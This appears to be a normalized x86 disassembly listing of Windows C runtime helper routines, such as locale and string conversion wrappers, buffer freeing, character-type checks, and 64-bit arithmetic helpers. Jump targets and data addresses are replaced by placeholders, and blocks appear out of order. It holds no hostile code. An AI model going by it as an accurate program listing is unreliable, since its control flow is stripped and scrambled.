cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_4047c5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_405d3f
push 0x16
pop esi
mov [ eax ] esi
call sub_4071e0
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_405d3f
mov [ eax ] 0x2a
call sub_405d3f
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_405d3f
push 0x22
pop esi
mov [ eax ] esi
call sub_4071e0
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_40aef0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_40aef0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40ccfd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4047c5
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40cd50
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_40cde5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_404538
pop ecx
sub_40ce05
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4042ed
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_40cde5
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_404572
pop ecx
cmp eax ebx
je r-xdata
call sub_40f130
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_40cde5
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_404572
pop ecx
cmp eax ebx
je r-xdata
call sub_40f130
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_40cfec
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4047c5
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40ce05
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40d032
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4042ed
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_40aef0
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_40cde5
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_404572
pop ecx
cmp eax ebx
je r-xdata
call sub_40f130
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_40d119
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4047c5
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40d032
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40d159
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_404538
push [ esi + 0x8 ]
call sub_404538
push [ esi + 0xc ]
call sub_404538
push [ esi + 0x10 ]
call sub_404538
push [ esi + 0x14 ]
call sub_404538
push [ esi + 0x18 ]
call sub_404538
push [ esi ]
call sub_404538
push [ esi + 0x20 ]
call sub_404538
push [ esi + 0x24 ]
call sub_404538
push [ esi + 0x28 ]
call sub_404538
push [ esi + 0x2c ]
call sub_404538
push [ esi + 0x30 ]
call sub_404538
push [ esi + 0x34 ]
call sub_404538
push [ esi + 0x1c ]
call sub_404538
push [ esi + 0x38 ]
call sub_404538
push [ esi + 0x3c ]
call sub_404538
add esp 0x40
push [ esi + 0x40 ]
call sub_404538
push [ esi + 0x44 ]
call sub_404538
push [ esi + 0x48 ]
call sub_404538
push [ esi + 0x4c ]
call sub_404538
push [ esi + 0x50 ]
call sub_404538
push [ esi + 0x54 ]
call sub_404538
push [ esi + 0x58 ]
call sub_404538
push [ esi + 0x5c ]
call sub_404538
push [ esi + 0x60 ]
call sub_404538
push [ esi + 0x64 ]
call sub_404538
push [ esi + 0x68 ]
call sub_404538
push [ esi + 0x6c ]
call sub_404538
push [ esi + 0x70 ]
call sub_404538
push [ esi + 0x74 ]
call sub_404538
push [ esi + 0x78 ]
call sub_404538
push [ esi + 0x7c ]
call sub_404538
add esp 0x40
push [ esi + 0x80 ]
call sub_404538
push [ esi + 0x84 ]
call sub_404538
push [ esi + 0x88 ]
call sub_404538
push [ esi + 0x8c ]
call sub_404538
push [ esi + 0x90 ]
call sub_404538
push [ esi + 0x94 ]
call sub_404538
push [ esi + 0x98 ]
call sub_404538
push [ esi + 0x9c ]
call sub_404538
push [ esi + 0xa0 ]
call sub_404538
push [ esi + 0xa4 ]
call sub_404538
push [ esi + 0xa8 ]
call sub_404538
push [ esi + 0xbc ]
call sub_404538
push [ esi + 0xc0 ]
call sub_404538
push [ esi + 0xc4 ]
call sub_404538
push [ esi + 0xc8 ]
call sub_404538
push [ esi + 0xcc ]
call sub_404538
add esp 0x40
push [ esi + 0xd0 ]
call sub_404538
push [ esi + 0xb8 ]
call sub_404538
push [ esi + 0xd8 ]
call sub_404538
push [ esi + 0xdc ]
call sub_404538
push [ esi + 0xe0 ]
call sub_404538
push [ esi + 0xe4 ]
call sub_404538
push [ esi + 0xe8 ]
call sub_404538
push [ esi + 0xec ]
call sub_404538
push [ esi + 0xd4 ]
call sub_404538
push [ esi + 0xf0 ]
call sub_404538
push [ esi + 0xf4 ]
call sub_404538
push [ esi + 0xf8 ]
call sub_404538
push [ esi + 0xfc ]
call sub_404538
push [ esi + 0x100 ]
call sub_404538
push [ esi + 0x104 ]
call sub_404538
push [ esi + 0x108 ]
call sub_404538
add esp 0x40
push [ esi + 0x10c ]
call sub_404538
push [ esi + 0x110 ]
call sub_404538
push [ esi + 0x114 ]
call sub_404538
push [ esi + 0x118 ]
call sub_404538
push [ esi + 0x11c ]
call sub_404538
push [ esi + 0x120 ]
call sub_404538
push [ esi + 0x124 ]
call sub_404538
push [ esi + 0x128 ]
call sub_404538
push [ esi + 0x12c ]
call sub_404538
push [ esi + 0x130 ]
call sub_404538
push [ esi + 0x134 ]
call sub_404538
push [ esi + 0x138 ]
call sub_404538
push [ esi + 0x13c ]
call sub_404538
push [ esi + 0x140 ]
call sub_404538
push [ esi + 0x144 ]
call sub_404538
push [ esi + 0x148 ]
call sub_404538
add esp 0x40
push [ esi + 0x14c ]
call sub_404538
push [ esi + 0x150 ]
call sub_404538
push [ esi + 0x154 ]
call sub_404538
push [ esi + 0x158 ]
call sub_404538
push [ esi + 0x15c ]
call sub_404538
push [ esi + 0x160 ]
call sub_404538
add esp 0x18
sub_40d4d0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
push esi
call sub_404538
pop ecx
sub_40d539
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_404538
pop ecx
push esi
call sub_404538
pop ecx
sub_40d637
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_4047c5
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40ccfd
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_40d119
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40d6f0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_40d740
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_40d780
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4047c5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_40d637
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_40d7d1
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_40d780
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_40d7ff
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4047c5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_40d637
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_40d855
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_40d7ff
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_40d885
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4047c5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_40d637
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_40d8d6
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_40d885
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_40d904
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
push esi
call sub_409b27
pop ecx
mov edx rw-data
cmp eax edi
je r-xdata
mov eax edi
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al al
jns r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
cmp eax edi
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_40cad6
pop ecx
test al 0x2
jne r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
jmp r-xdata
sub_40d9e7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_4047c5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_40ccfd
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_405d3f
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40db20
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40db54
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_40f15c
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_40dba0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_40dbcb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_405d3f
mov [ eax ] 0x9
call sub_405d52
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40dc4c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_405d3f
mov [ eax ] 0x9
call sub_405d52
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40dcd2
mov edi edi
push ebp
